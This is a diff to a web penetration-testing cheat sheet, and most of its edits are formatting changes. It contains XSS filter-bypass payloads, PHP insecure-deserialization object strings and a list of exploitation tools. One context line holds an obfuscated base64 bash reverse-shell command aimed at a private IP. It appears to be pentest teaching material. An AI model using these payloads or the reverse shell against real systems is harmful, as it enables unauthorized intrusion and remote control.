@@ -194,14 +194,13 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
  
 #### Alert Blocked - Bypass
   
-`<script>\u0061lert(1)</script>`
-  
-`<script>\u0061\u006C\u0065\u0072\u0074(1)</script>`
-  
-`<script>eval("\u0061lert(1)")</script>`
-  
-`<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>`
-  
+```
+<script>\u0061lert(1)</script>
+<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+<script>eval("\u0061lert(1)")</script>  
+<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
+```
+
 #### Removing script Tag
   
 `<sCR<script>iPt>alert(1)</SCr</script>IPt>`
@@ -213,7 +212,7 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
 -> unescape  
 
 e.g.  
--> decode URI + unescape method  
+-> decode URI + unescape method (need eval)  
 `decodeURI(/alert(%22xss%22)/.source)`  
 `decodeURIComponent(/alert(%22xss%22)/.source)`  
  
@@ -295,8 +294,8 @@ http://www.jsfuck.com/
 https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html  
 
 ### Decoder - Obfuscation (Javascript Decoder and PHP)
-  
-https://malwaredecoder.com/
+
+https://malwaredecoder.com/  
 
 ## XSS - Session Hijacking
 
@@ -318,41 +317,32 @@ change your header in PHP code ]
 https://www.exploit-db.com/papers/13694
 
 ## Insecure Deserialization 
-
--> Binary
-
--> Human-Readable
+-> Binary  
+-> Human-Readable  
 
 ### PHP Deserialization
-
 #### PHP - Method Serialization:
 
--> serialize()
-
--> unserialize()
+-> serialize()  
+-> unserialize()  
 
 #### Magic Methods:
 
--> __construct()
-
--> __destruct()
-
--> __wakeup()
+-> __construct()  
+-> __destruct()  
+-> __wakeup()  
 
 #### Class Properties
 
 Examples:
 
-Public \<s>
- 
+Public \<s>  
 `O:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}`
   
-Protected \0 * \0
-
+Protected \0 * \0  
 `O:4:"Okay":1:{s:11:"' . "\0" . '*' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}`
 
-Private \0 \<s> \0
-  
+Private \0 \<s> \0    
 `O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}`
   
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/example.php
@@ -370,22 +360,17 @@ https://github.com/ambionics/phpggc
 https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/token_hmac_sha1.php
 
 ### .NET Deserialization
-
 #### Methods Serialization:
 
--> Binary Formatter
-
--> DataContractSerializer
-
--> NetDataContractSerializer
-
--> XML Serialization
+-> Binary Formatter  
+-> DataContractSerializer  
+-> NetDataContractSerializer  
+-> XML Serialization  
   
 #### Most common places to find serialized data
 
--> VIEWSTATE
-    
--> .NET remoting services
+-> VIEWSTATE  
+-> .NET remoting services  
 
 #### Identify
 
@@ -431,7 +416,6 @@ bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|
 ```
 https://github.com/rodolfomarianocy/hackshell
 #### Tools
-
 https://github.com/frohoff/ysoserial  
 https://github.com/NickstaDB/SerializationDumper  
 https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
